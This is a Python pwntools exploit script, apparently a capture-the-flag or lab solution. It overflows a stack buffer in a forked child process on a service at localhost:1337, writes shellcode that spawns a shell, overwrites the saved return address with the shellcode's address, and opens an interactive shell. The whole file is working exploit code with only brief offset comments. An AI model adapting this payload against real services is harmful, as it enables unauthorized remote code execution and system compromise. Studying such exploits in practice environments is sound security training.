from pwn import *

context.arch = "amd64"

shellcode = asm(shellcraft.sh())

host = "localhost"
port = 1337
target = remote(host, port)

buf_size = 0x10000  # 65536

main_rsp_addr = 0x7FFD96C87C10  # given by program

child_stack_offset = 0x10020  # space for the large buffer, check in GDB
child_rsp_addr = main_rsp_addr - child_stack_offset
buf_addr = child_rsp_addr  # buffer is at start of forked child's stack, check in GDB
saved_rip_offset = 0x10018  # offset of saved rip from forked child's rsp, check in GDB

shellcode_addr = p64(buf_addr)

payload = (
    shellcode
    + b"a" * (buf_size - len(shellcode))  # padding, fill the buffer after the shellcode
    + b"b"
    * (saved_rip_offset - buf_size)  # padding, fill gap between buffer and saved rip
    + shellcode_addr
)

print(len(payload))

target.sendline(payload)

target.interactive()
